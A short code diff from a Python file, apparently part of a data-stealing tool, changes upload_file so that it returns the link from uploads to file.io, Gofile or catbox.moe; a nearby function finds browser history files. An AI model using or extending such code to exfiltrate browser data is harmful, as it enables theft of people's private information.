@@ -1303,11 +1303,12 @@ def fileioupload(path):
 
 def upload_file(path):
     if fileio == True:
-        fileioupload(path)
+        url = fileioupload(path)
     elif Gofile == True:
-        gofileupload(path)
+        url = gofileupload(path)
     elif catbox == True:
-        catboxmoeupload(path)
+        url = catboxmoeupload(path)
+    return url
         
 def find_history_file(browser_name, path_template):
     if os.name == "nt":
